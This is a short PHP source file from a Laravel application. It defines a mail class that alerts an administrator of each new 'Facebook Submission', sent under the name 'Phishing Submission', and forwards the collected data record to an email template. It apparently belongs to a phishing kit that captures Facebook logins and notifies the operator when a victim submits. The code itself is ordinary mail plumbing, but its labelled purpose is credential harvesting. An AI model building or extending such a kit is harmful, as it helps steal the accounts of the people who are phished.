<?php

namespace App\Mail;

use App\Models\CollectedData;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Mail\Mailables\Address;
use Illuminate\Mail\Mailables\Content;
use Illuminate\Mail\Mailables\Envelope;
use Illuminate\Queue\SerializesModels;

class AlertAdminOfNewSubmission extends Mailable
{
    use Queueable, SerializesModels;

    public $collectedData;
    /**
     * Create a new message instance.
     */
    public function __construct(CollectedData $collectedData)
    {
        $this->collectedData = $collectedData;
    }

    /**
     * Get the message envelope.
     */
    public function envelope(): Envelope
    {
        return new Envelope(
            from: new Address('admin@example.com', 'Phishing Submission'),
            subject: 'Alert Admin Of New Facebook Submission',
        );
    }

    /**
     * Get the message content definition.
     */
    public function content(): Content
    {
        return new Content(
            view: 'email.alert',
            with: [
                'collectedData' => $this->collectedData
            ]
        );
    }

    /**
     * Get the attachments for the message.
     *
     * @return array<int, \Illuminate\Mail\Mailables\Attachment>
     */
    public function attachments(): array
    {
        return [];
    }
}
